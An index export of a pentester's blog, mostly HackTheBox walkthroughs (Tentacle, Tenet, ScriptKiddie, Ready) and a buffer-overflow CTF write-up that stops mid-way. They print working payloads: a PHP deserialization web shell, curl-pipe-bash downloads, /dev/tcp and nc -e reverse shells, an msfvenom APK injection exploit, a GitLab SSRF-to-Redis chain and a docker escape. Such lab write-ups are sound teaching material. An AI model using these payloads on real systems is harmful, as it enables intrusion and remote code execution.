[{"authors":null,"categories":null,"content":"med@pentest:# cat /home/bio.txt I am a Pentester/Red Teamer from Tunisia, whose main interest is CyberSecurity and Networking. I enjoy playing CTFs with my Team Gangsters known as Sup\u0026rsquo;Hackers. We\u0026rsquo;re ranked 6th in tunisia @CTFtime 2020 \nPro Hacker @HackThebox  0xA Hunter @TryHackMe\n","date":1623974400,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1623974400,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"med@pentest:# cat /home/bio.txt I am a Pentester/Red Teamer from Tunisia, whose main interest is CyberSecurity and Networking. I enjoy playing CTFs with my Team Gangsters known as Sup\u0026rsquo;Hackers. We\u0026rsquo;re ranked 6th in tunisia @CTFtime 2020","tags":null,"title":"Mohamed Elleuch","type":"authors"},{"authors":[],"categories":null,"content":" Click on the Slides button above to view the built-in slides feature.   Slides can be added in a few ways:\n Create slides using Wowchemy\u0026rsquo;s Slides feature and link using slides parameter in the front matter of the talk file Upload an existing slide deck to static/ and link using url_slides parameter in the front matter of the talk file Embed your slides (e.g. Google Slides) or presentation video on this page using shortcodes.  Further event details, including page elements such as image galleries, can be added to the body of this page.\n","date":1906549200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1906549200,"objectID":"a8edef490afe42206247b6ac05657af0","permalink":"https://mohamed-elleuch.me/talk/example-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/example-talk/","section":"event","summary":"An example talk using Wowchemy's Markdown slides feature.","tags":[],"title":"Example Talk","type":"event"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.224 -v  22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA) | 256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA) |_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519) 53/tcp open domain ISC BIND 9.11.20 (RedHat Enterprise Linux 8) | dns-nsid: |_ bind.version: 9.11.20-RedHat-9.11.20-5.el8 88/tcp open kerberos-sec MIT Kerberos (server time: 2021-06-18 13:07:47Z) 3128/tcp open http-proxy Squid http proxy 4.11 |_http-server-header: squid/4.11 |_http-title: ERROR: The requested URL could not be retrieved 9090/tcp closed zeus-admin  We have 3 ports open:\n  22/ssh : OpenSSH 8.0\n  53/dns : ISC BIND 9.11.20\n  88/kerberos : MIT Kerberos\n  Web Server  We get a username and two domain names !\nj.nakazawa@realcorp.htb srv01.realcorp.htb  Let\u0026rsquo;s add them to /etc/hosts\nNothing interesting, let\u0026rsquo;s move on\nKerberos  We have a valid username and a domain! let\u0026rsquo;s try to dump his KRBASREP5 hash\nsudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py realcorp.htb/j.nakazawa -no-pass  But sadly it\u0026rsquo;s uncrackable, let\u0026rsquo;s move on\nDNS ENUM\n This machine has a DNS and proxy service running, we can guess that it\u0026rsquo;s routing trafics to other machines\nLet\u0026rsquo;s find out\ndnsenum --enum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt realcorp.htb  We have more IPs and domains, but we can\u0026rsquo;t access anyone of them.\nWe\u0026rsquo;ll be using proxychains ( Dynamic chain )\nWe\u0026rsquo;ll be adding these 3 lines to /etc/proxychains.conf and the domains to /etc/hosts\nhttp 10.10.10.224 3128 http 127.0.0.1 3128 http 10.197.243.77 3128  Foothold   Let\u0026rsquo;s first run nmap on the new IPs\nsudo proxychains4 -f /etc/proxychains.conf nmap -Pn -sT -v 10.197.243.31  22/tcp open ssh 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 464/tcp open kpasswd5 749/tcp open kerberos-adm 3128/tcp open squid-http  There is a webserver running, let\u0026rsquo;s try to access it\nproxychains4 -f /etc/proxychains.conf firefox  Since this ip is mapped to wpad.realcorp.htb\nWe can now get the web proxy auto discovery config (wpad.dat)\nproxychains4 -f /etc/proxychains.conf curl http://wpad.realcorp.htb/wpad.dat  We have another network IP 10.241.251.0\nproxychains4 -f /etc/proxychains.conf nmap 10.241.251.0/24 -Pn  After waiting a bit, we can get an active host 10.241.251.113\nproxychains4 -f /etc/proxychains.conf nmap 10.241.251.113 -sV -Pn  PORT STATE SERVICE VERSION 25/tcp open smtp OpenSMTPD  We can grab an exploit from exploitdb\n I\u0026rsquo;ll be using this exploit : https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py\n proxychains4 -f /etc/proxychains.conf python3 exp.py 10.241.251.113 25 10.10.14.68 9001 j.nakazawa@realcorp.htb  And we\u0026rsquo;re on the box\n User Flag   An interesting file in the user home directory\n# Set default values for all following accounts. defaults auth on tls on tls_trust_file /etc/ssl/certs/ca-certificates.crt logfile /dev/null # RealCorp Mail account realcorp host 127.0.0.1 port 587 from j.nakazawa@realcorp.htb user j.nakazawa password sJB}RM\u0026gt;6Z~64_ tls_fingerprint\tC9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60 # Set a default account account default : realcorp  We found a password, but i couldn\u0026rsquo;t ssh into the box with it\nThe trick is to generate a tgs kk to ssh into the box\nBut first, we need to edit /etc/krb5.conf\n I was stuck at this part for a while trying to figure out what i did wrong, until i gave up and asked someone for a hint dns_canonicalize_hostname = false was needed\n And let\u0026rsquo;s generate the ticket\nLet\u0026rsquo;s try to ssh as j.nakazawa\n Root Flag   After running LinPEAS, we can see that there a cronjob\n#!/bin/bash /usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/ cd /home/admin /usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log /usr/bin/rm -f access.log cache.log  It copies everything from /var/log/squid/ to /home/admin\nSo the trick is to create .k5login in /var/log/squid so it gets copied to the admin\u0026rsquo;s user home directory and we ssh into it\n  Now we\u0026rsquo;re the admin user\nEnumerating a bit, we can find someone interesting /etc/krb5.keytab\n It\u0026rsquo;s extracted from the KDC database of \u0026ldquo;principals\u0026rdquo; and which contain the encryption key for a service or a host.\n Let\u0026rsquo;s open the kadmin console\nkadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB  then add the root as a principal to the database\n https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html\n add_principal root@REALCORP.HTB  Now we can get login as root with ksu\n https://linux.die.net/man/1/ksu\n And we rooted the box!\nThanks for reading hope you enjoyed it! ","date":1623974400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1623974400,"objectID":"cdddc406861fe66275db5d45df6da2cf","permalink":"https://mohamed-elleuch.me/writeups/htb-tentacle/","publishdate":"2021-06-18T00:00:00Z","relpermalink":"/writeups/htb-tentacle/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Tentacle, Which is a Hard rated Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Tentacle Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.223 -v  22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  We have two ports open\n  22/ssh : OpenSSH 7.6p1\n  80/http : Apache httpd 2.4.29\n  Web Enum  Nothing interesting, let\u0026rsquo;s try to add tenet.htb to our /etc/hosts\nIt\u0026rsquo;s a wordpress page, after enumerating a bit we can find an interesting comment\n  We first have a username \u0026ldquo;neil\u0026rdquo;\n  A sator php file and it\u0026rsquo;s backup has been deleted?\n  It didn\u0026rsquo;t work in tenet.htb\nLet\u0026rsquo;s try on the main website\nThe comment mentioned a backup file aswell\nlet\u0026rsquo;s make a small list for some backup extension to fuzz\nbackup bck old save bak sav copy old orig tmp txt back  ffuf -c -w backup -u http://10.10.10.223/sator.php.FUZZ  And there is a file named \u0026ldquo;sator.php.bak\u0026rdquo;\nAnd we get the source of the sator.php file\n Foothold   \u0026lt;?php class DatabaseExport { public $user_file = 'users.txt'; public $data = ''; public function update_db() { echo '[+] Grabbing users from text file \u0026lt;br\u0026gt;'; $this-\u0026gt; data = 'Success'; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this -\u0026gt;user_file, $this-\u0026gt;data); echo '[] Database updated \u0026lt;br\u0026gt;'; //\techo 'Gotta get this working properly...'; } } $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt;  \u0026ndash;\u0026gt; PHP Insecure Deserialization\nWe can actually create a simple cmd shell\nWe\u0026rsquo;ll use this php script to forge our serialized payload\n\u0026lt;?php class DatabaseExport { public $user_file = 'cmd.php'; public $data = '\u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;])?\u0026gt;'; } $bad= new DatabaseExport; echo serialize($bad); ?\u0026gt;  Output:\nO:14:\u0026quot;DatabaseExport\u0026quot;:2:{s:9:\u0026quot;user_file\u0026quot;;s:7:\u0026quot;cmd.php\u0026quot;;s:4:\u0026quot;data\u0026quot;;s:28:\u0026quot;\u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;])?\u0026gt;\u0026quot;;}  our final payload\nhttp://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3F%3E%22%3B%7D  Seems like it worked! let\u0026rsquo;s check if we have our cmd working\nAnd yes! we have code exec\nlet\u0026rsquo;s get a reverse shell on the machine\nhttp://10.10.10.223/cmd.php?cmd=curl%20http://10.10.14.105:8000/x|bash   x is just a reverse shell https://resh.vercel.app/\n  User flag   Let\u0026rsquo;s check the wp-config.php for creds\n /** MySQL database username */ define( 'DB_USER', 'neil' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' );   Root flag   neil can run /usr/local/bin/enableSSH.sh as root\n#!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026quot; \u0026quot; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026quot;Successfully added $sshName to authorized_keys file!\u0026quot; else /bin/echo \u0026quot;Error in adding $sshName to authorized_keys file!\u0026quot; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026quot;Error in creating key file!\u0026quot; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026quot; addKey checkAdded  What seems to be interesting is the addKey function which creates a temporary file with a random name then it puts the content of the key variable into it then the key is copied to the authorized_keys file\nWhat seems odd about this function is the mktemp let\u0026rsquo;s google about this function\nCaveats: In general, avoid using mktemp(), because a hostile process can exploit a race condition in the time between the generation of a temporary filename by mktemp() and the invoker's use of the temporary name. Use mkstemp() instead.  To sum up, mktemp is vulnerable to race condition we\u0026rsquo;ll take advantage of the time gap resulted when using this function!\nwe\u0026rsquo;ll inject our public ssh key into the temporary file created\nFirst we let the while loop run\nwhile true; do echo \u0026quot;ssh-rsa AAAAB3NzaC---SNIP---DgRk=\u0026quot; | tee /tmp/ssh-* ;done  then we execute the script\nand ssh into the box as root\nThanks for reading hope you enjoyed it! ","date":1623456000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1623456000,"objectID":"bde50cda924cd7ec195d87eb452a1890","permalink":"https://mohamed-elleuch.me/writeups/htb-tenet/","publishdate":"2021-06-12T00:00:00Z","relpermalink":"/writeups/htb-tenet/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Tenet, Which is a Medium Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Tenet Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.226 -v  Discovered open port 22/tcp on 10.10.10.226 Discovered open port 5000/tcp on 10.10.10.226  We have two ports open\n 22/SSH : OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 5000/HTTP : Werkzeug httpd 0.16.1  \u0026ndash;\u0026gt; Service versions seem to be up-to-date, we don\u0026rsquo;t really focus on them\nWeb Server  \u0026ndash;\u0026gt; We have so many user inputs, first thing we should check if there is any command injections as it seem to be using linux binaries which can lead to RCE\n\u0026ndash;\u0026gt; It seems that the input is hardcoded, taking into considerating that this is an easy box i don\u0026rsquo;t that we should try to bypass these filters and just move on\nFoothold \u0026amp; User flag   Another interesting thing is the file upload that takes a msfvenom template!\nSearching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box\n https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md\n Payload:\n#!/usr/bin/env python3 import subprocess import tempfile import os from base64 import b32encode payload = 'curl http://10.10.14.54:1337/x|bash' payload_b32 = b32encode(payload.encode()).decode() dname = f\u0026quot;CN='|echo {payload_b32} | base32 -d | sh #\u0026quot; print(f\u0026quot;[+] Manufacturing evil apkfile\u0026quot;) print(f\u0026quot;Payload: {payload}\u0026quot;) print(f\u0026quot;-dname: {dname}\u0026quot;) print() tmpdir = tempfile.mkdtemp() apk_file = os.path.join(tmpdir, \u0026quot;evil.apk\u0026quot;) empty_file = os.path.join(tmpdir, \u0026quot;empty\u0026quot;) keystore_file = os.path.join(tmpdir, \u0026quot;signing.keystore\u0026quot;) storepass = keypass = \u0026quot;password\u0026quot; key_alias = \u0026quot;signing.key\u0026quot; # Touch empty_file open(empty_file, \u0026quot;w\u0026quot;).close() # Create apk_file subprocess.check_call([\u0026quot;zip\u0026quot;, \u0026quot;-j\u0026quot;, apk_file, empty_file]) # Generate signing key with malicious -dname subprocess.check_call([\u0026quot;keytool\u0026quot;, \u0026quot;-genkey\u0026quot;, \u0026quot;-keystore\u0026quot;, keystore_file, \u0026quot;-alias\u0026quot;, key_alias, \u0026quot;-storepass\u0026quot;, storepass, \u0026quot;-keypass\u0026quot;, keypass, \u0026quot;-keyalg\u0026quot;, \u0026quot;RSA\u0026quot;, \u0026quot;-keysize\u0026quot;, \u0026quot;2048\u0026quot;, \u0026quot;-dname\u0026quot;, dname]) # Sign APK using our malicious dname subprocess.check_call([\u0026quot;jarsigner\u0026quot;, \u0026quot;-sigalg\u0026quot;, \u0026quot;SHA1withRSA\u0026quot;, \u0026quot;-digestalg\u0026quot;, \u0026quot;SHA1\u0026quot;, \u0026quot;-keystore\u0026quot;, keystore_file, \u0026quot;-storepass\u0026quot;, storepass, \u0026quot;-keypass\u0026quot;, keypass, apk_file, key_alias]) print() print(f\u0026quot;[+] Done! apkfile is at {apk_file}\u0026quot;) print(f\u0026quot;Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\u0026quot;)  Let\u0026rsquo;s execute the apk file\nAnd set a listener to get a reverse shell on the box Let\u0026rsquo;s stabilize our shell\n2nd USER \u0026amp; Root Flag   Looking a bit in the files, we can find an interesting file owned by pwn user!\nBasically it takes the ips from the hackers file and run nmap on it!\nThe idea is to inject a malicious command instead of an ip\necho \u0026quot; ;/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/4444 0\u0026gt;\u0026amp;1' #\u0026quot; \u0026gt;\u0026gt;hackers   We should add two spaces because of the | cut -d' ' -f3- |\n We got a shell as the user pwn!\nLet\u0026rsquo;s check if he can run anything as root\nWe can run msfconsole as root! basically a free win :D!\nsudo /opt/metasploit-framework-6.0.9/msfconsole  And we can execute commands as root\nAnd we rooted the box!\nThanks for reading hope you enjoyed it! ","date":1622851200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1622851200,"objectID":"934be42aaea16bed9dc07faa1cb33d89","permalink":"https://mohamed-elleuch.me/writeups/htb-scriptkiddie/","publishdate":"2021-06-05T00:00:00Z","relpermalink":"/writeups/htb-scriptkiddie/","section":"writeups","summary":"Here's my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - ScriptKiddie Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  We only have two ports open\n  22/SSH : OpenSSH 8.2p1 Ubuntu 4\n  5080/http : nginx\n  Web Server\n We get a simple Gitlab sign in page. First let\u0026rsquo;s make an account\nNow let\u0026rsquo;s look for a version or anything that could help us.\nWe get the gitlab\u0026rsquo;s version and an interesting update asap highlighted in red, Which means it probably vulnerable\nAnd yeah..! we were right\n Most of the POCs and github repositories were published after the box being launched, so we we won\u0026rsquo;t be using them and we\u0026rsquo;ll do everything manually and get our hands dirty first.\n Foothold \u0026amp; User Flag (Intended way)\n  Looking at the latest commits, we can understand what we\u0026rsquo;re going to exploit\n\u0026mdash;\u0026gt; So basically, we\u0026rsquo;re going to bypass the SSRF protection using special IPv6 Addresses as we in the previous picture\nhttps://[0:0:0:0:0:ffff:127.0.0.1]/foo/foo.git https://[::ffff:127.0.0.1]/foo/foo.git etc..  Going back to the commit history, we can see another interesting vulnerability\nThis vulnerability will come handy later on by adding newlines to our payload and that\u0026rsquo;s by chaining both of these vulnerabilities in order to get an RCE.\nSo now we understood what will be causing the RCE, we can dive in and get our shell!\nWe\u0026rsquo;ll be using the payload mentioned here: https://hackerone.com/reports/299473\n multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026quot;{\\\u0026quot;class\\\u0026quot;:\\\u0026quot;GitlabShellWorker\\\u0026quot;,\\\u0026quot;args\\\u0026quot;:[\\\u0026quot;class_eval\\\u0026quot;,\\\u0026quot;open(\\'|whoami | nc \u0026lt;ip\u0026gt; 80\\').read\\\u0026quot;],\\\u0026quot;retry\\\u0026quot;:3,\\\u0026quot;queue\\\u0026quot;:\\\u0026quot;system_hook_push\\\u0026quot;,\\\u0026quot;jid\\\u0026quot;:\\\u0026quot;ad52abc5641173e217eb2e52\\\u0026quot;,\\\u0026quot;created_at\\\u0026quot;:1513714403.8122594,\\\u0026quot;enqueued_at\\\u0026quot;:1513714403.8129568}\u0026quot; exec  Now let\u0026rsquo;s chain both the two previous vulnerabilities.\n Before throwing a reverse shell, ping your machine first to confirm that we have code exec on the machine. for the sake of the writeup i\u0026rsquo;ll be getting directly a reverse shell\n git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026quot;{\\\u0026quot;class\\\u0026quot;:\\\u0026quot;GitlabShellWorker\\\u0026quot;,\\\u0026quot;args\\\u0026quot;:[\\\u0026quot;class_eval\\\u0026quot;,\\\u0026quot;open(\\'|nc 10.10.14.17 4444 -e /bin/bash \\').read\\\u0026quot;],\\\u0026quot;retry\\\u0026quot;:3,\\\u0026quot;queue\\\u0026quot;:\\\u0026quot;system_hook_push\\\u0026quot;,\\\u0026quot;jid\\\u0026quot;:\\\u0026quot;ad52abc5641173e217eb2e52\\\u0026quot;,\\\u0026quot;created_at\\\u0026quot;:1513714403.8122594,\\\u0026quot;enqueued_at\\\u0026quot;:1513714403.8129568}\u0026quot; exec exec /elleuch.git  We URL encode our payload\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/A%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Cnc%2010.10.14.17%204444%20-e%20%2Fbin%2Fbash%20%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/elleuch.git  So now we have a ready-to-use payload, let\u0026rsquo;s back to the web page to see where we\u0026rsquo;re gonna throw it\nAnd yeah! We can import projects by URLs, Exactly what we needed\nLet\u0026rsquo;s use our payload and set a listener and see if we get a shell\nAnd we\u0026rsquo;re on the box!\nLet\u0026rsquo;s get a proper shell\nAnd grab the user.txt\n User Flag (Unintended way)\n  When i first rooted the box, it seemed to be also vulnerable to\nArbitrary file read via the UploadsRewriter when moving an issue\nThat we already done in Laboratory Writeup\n I am not sure if the creator patched it or no, but you can still try it !\n  Step1 : Get /etc/passwd  ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)   Step2 : Get /home/dude/user.txt  ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/dude/user.txt)   Root PrivEsc (Method 1 )\n  After enumerating a bit, we can find an interesting file\nWhich contains a password\nAnd it turns out to be the password the root of this docker container\nNow our goal is to escape it !\nLet\u0026rsquo;s check the /opt/backup/docker-compose.yml\nIt seems like we\u0026rsquo;re in a privileged docker!\n An interesting blog post to check ! https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/\n mkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \u0026quot;$host_path/cmd\u0026quot; \u0026gt; /tmp/cgrp/release_agent echo '#!/bin/sh' \u0026gt; /cmd echo \u0026quot;echo 'public_rsa' \u0026gt; /root/.ssh/authorized_keys \u0026quot; \u0026gt;\u0026gt; /cmd chmod a+x /cmd sh -c \u0026quot;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026quot;  And voilà we\u0026rsquo;re root!\n Root PrivEsc (Method 2)\n  Way simpler than first one!\nFirst let\u0026rsquo;s check mounts\ndf -aTh # Or mount -l  let\u0026rsquo;s try to mount /dev/sda2\nAnd yeaah! we can access the box's file system Let\u0026rsquo;s check if we can grab the root flag and it\u0026rsquo;s ssh private key\nNow let\u0026rsquo;s ssh into root with his key\nThanks for reading hope you enjoyed it! ","date":1621036800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1621036800,"objectID":"5262187ba1b7079c95f38895f89df539","permalink":"https://mohamed-elleuch.me/writeups/htb-ready/","publishdate":"2021-05-15T00:00:00Z","relpermalink":"/writeups/htb-ready/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Ready, Which is a Medium Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Ready Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering  Nmap scan  sudo nmap -sC -sV 3.121.99.159 -v  PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: EC2AMAZ-HF7234C | NetBIOS_Domain_Name: EC2AMAZ-HF7234C | NetBIOS_Computer_Name: EC2AMAZ-HF7234C | DNS_Domain_Name: EC2AMAZ-HF7234C | DNS_Computer_Name: EC2AMAZ-HF7234C | Product_Version: 10.0.17763 |_ System_Time: 2021-04-19T19:39:58+00:00 | ssl-cert: Subject: commonName=EC2AMAZ-HF7234C | Issuer: commonName=EC2AMAZ-HF7234C | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-02-20T08:01:53 | Not valid after: 2021-08-22T08:01:53 | MD5: 7635 3668 55ed 74c9 448a cee5 b46a afa4 |_SHA-1: 0b57 e7e8 e874 1e70 2779 e4c1 3dc0 afca 13bb 8f70 |_ssl-date: 2021-04-19T19:40:07+00:00; -17s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -16s, deviation: 2s, median: -17s | smb-os-discovery: | OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3) | Computer name: EC2AMAZ-HF7234C | NetBIOS computer name: EC2AMAZ-HF7234C\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-04-19T19:40:02+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-19T19:40:01 |_ start_date: N/A  SMB Enum  smbmap -u guest -H 3.121.99.159  vulnserver-master seems interesting, let\u0026rsquo;s take a look at it smbclient //3.121.99.159/vulnserver-master -U guest -p  Let\u0026rsquo;s download these 2 files\nSuper Secure Server\n So basically from the name of the box,finding an executable and also the essfunc.dll which comes with the vulnserver, we can presume we\u0026rsquo;re going to deal with a vulnerability!\nWe\u0026rsquo;re still missing something, on which port is this service is running?\nLet\u0026rsquo;s run a full port nmap scan again\nsudo nmap -T4 -p- 3.121.99.159 -v  Discovered open port 21/tcp on 3.121.99.159 Discovered open port 3389/tcp on 3.121.99.159 Discovered open port 139/tcp on 3.121.99.159 Discovered open port 445/tcp on 3.121.99.159 Discovered open port 135/tcp on 3.121.99.159 Discovered open port 5985/tcp on 3.121.99.1594 Discovered open port *1887*/tcp on 3.121.99.159  Let\u0026rsquo;s try if any of the new ports gets anything, seems like 1887 is the one we\u0026rsquo;re looking for\nNow we\u0026rsquo;ll have to find the vulnerable command\nLet\u0026rsquo;s play around the executable file that we got\nstrings super_secure_server.exe  Scrolling a bit we can find something interesting\n...snip... Received a client connection from %s:%u Usage: %s [port_number] If no port number is provided, the default port of %s will be used. Welcome to the super secure server! Enter HELP for help Send failed with error: %d HELP HELP SECRET Mission Completed EXIT GOODBYE Connection closing... UNKNOWN COMMAND ...snip...  SECRET is the command that we\u0026rsquo;re looking for\nPreparing the debugger\n  I\u0026rsquo;ll be using Immunity debbuger \u0026amp; mona for this https://www.immunityinc.com/products/debugger/ https://github.com/corelan/mona\n After opening the executeable with the debbuger we first we\u0026rsquo;re gonna set a working directory for mona at the buttom of the debbuger window\n!mona config -set workingfolder c:\\mona\\%p  It should look like this\nReading through the assembly code we can see something interesting\n; |ASCII \u0026quot;13337\u0026quot;  Which means this is the default port that the app will work on\nAnd yeah! It works\nNow let\u0026rsquo;s start the fun stuff!\nFuzzing  So now basically we\u0026rsquo;re going to send the server with a string that has an increasing length until it crashs!\nWe\u0026rsquo;ll be using this python script to make life easier\n#!/usr/bin/env python3 import socket, time, sys ip = \u0026quot;192.168.1.14\u0026quot; port = 13337 timeout = 5 prefix = \u0026quot;SECRET \u0026quot; string = prefix + \u0026quot;A\u0026quot; * 100 while True: try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) s.connect((ip, port)) s.recv(1024) print(\u0026quot;Fuzzing with {} bytes\u0026quot;.format(len(string) - len(prefix))) s.send(bytes(string, \u0026quot;latin-1\u0026quot;)) s.recv(1024) except: print(\u0026quot;Fuzzing crashed at {} bytes\u0026quot;.format(len(string) - len(prefix))) sys.exit(0) string += 100 * \u0026quot;A\u0026quot; time.sleep(1)  We run the script and wait until it crashes\nControlling EIP  The server crashed after sending 1000 bytes! Let\u0026rsquo;s generate a pattern with metasploit\n For good practice, we should choose a longer pattern ( More than 1000 bytes )\n 